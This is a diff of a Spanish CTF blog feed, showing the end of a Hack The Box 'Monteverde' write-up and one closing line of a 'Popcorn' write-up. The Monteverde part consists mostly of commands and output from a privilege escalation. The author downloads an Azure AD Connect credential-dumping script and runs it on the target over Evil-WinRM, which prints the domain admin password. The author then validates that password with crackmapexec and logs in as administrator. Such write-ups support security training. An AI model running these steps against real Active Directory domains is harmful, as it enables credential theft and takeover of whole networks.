-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user Administrator
-User name                    Administrator
-Full Name
-Comment                      Built-in account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;administering the computer/domain
-User&lt;span class=&quot;s1&quot;&gt;'s comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            1/2/2020 2:18:38 PM
-Password expires             Never
-Password changeable          1/3/2020 2:18:38 PM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   1/15/2022 6:21:49 PM
-
-Logon hours allowed          All
-
-Local Group Memberships      *Administrators       *ADSyncAdmins
-Global Group memberships     *Domain Admins        *Azure Admins
-                             *Group Policy Creator *Domain Users
-                             *Enterprise Admins    *Schema Admins
-The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; net group &quot;Domain Admins&quot;
-Group name     Domain Admins
-Comment        Designated administrators of the domain
-
-Members
-
--------------------------------------------------------------------------------
-Administrator
-The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El usuario &lt;strong&gt;Administrator&lt;/strong&gt; es el único que pertenece al grupo &lt;strong&gt;Domain Admins&lt;/strong&gt;, por lo tanto, vamos a buscar un exploit que nos ayude a escalar privilegios dentro de &lt;strong&gt;Azure Admins&lt;/strong&gt; y encontramos un recurso en internet &lt;a href=&quot;https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1&quot;&gt;Azure-ADConnect.ps1&lt;/a&gt;, así que lo descargamo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
-&lt;span class=&quot;nt&quot;&gt;--2022-01-15&lt;/span&gt; 19:28:27--  https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1
-Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
-Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.110.133]:443... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 2264 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.2K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
-Grabando a: «Azure-ADConnect.ps1»
-
-Azure-ADConnect.ps1              100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   2.21K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
-
-2022-01-15 19:28:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.3 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «Azure-ADConnect.ps1» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2264/2264]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora lo pasamos a la máquina víctima en un diretorio donde tengamos permisos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc
-
-
-    Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-d-----        1/15/2022   6:29 PM                Privesc
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; upload Azure-ADConnect.ps1
-Info: Uploading Azure-ADConnect.ps1 to C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;zure-ADConnect.ps1
-
-                                                             
-Data: 3016 bytes of 3016 bytes copied
-
-Info: Upload successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-
-
-    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/15/2022   6:30 PM           2264 Azure-ADConnect.ps1
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora importamos el módulo y ejecutamos la función correspondiente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Import-Module .&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;zure-ADConnect.ps1
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; Azure-ADConnect &lt;span class=&quot;nt&quot;&gt;-server&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-db&lt;/span&gt; ADSync
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain:  MEGABANK.LOCAL
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Username: administrator
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Password: d0m@in4dminyeah!
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos la contraseña del usuario &lt;strong&gt;Administrator&lt;/strong&gt; y como siempre, vamos a guardar las credenciales y validar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d0m@in4dminyeah!'&lt;/span&gt;
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator:d0m@in4dminyeah! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Son válidas, asi que ahora podemos conectarnos a la máquina ya como el usuario &lt;strong&gt;Administartor&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d0m@in4dminyeah!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;megabank&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Powershell" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Monteverde en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Vemos que dicho usuario se encuentra en el grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, es como si cambiara el nombre de &lt;strong&gt;root&lt;/strong&gt; por &lt;strong&gt;firefart&lt;/strong&gt;, conservando todos los privilegios del usuario &lt;strong&gt;root&lt;/strong&gt;; por lo tanto, de esta forma podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="Web" /><summary type="html">Resolución de la máquina Popcorn en la plataforma de Hack The Box</summary></entry></feed>
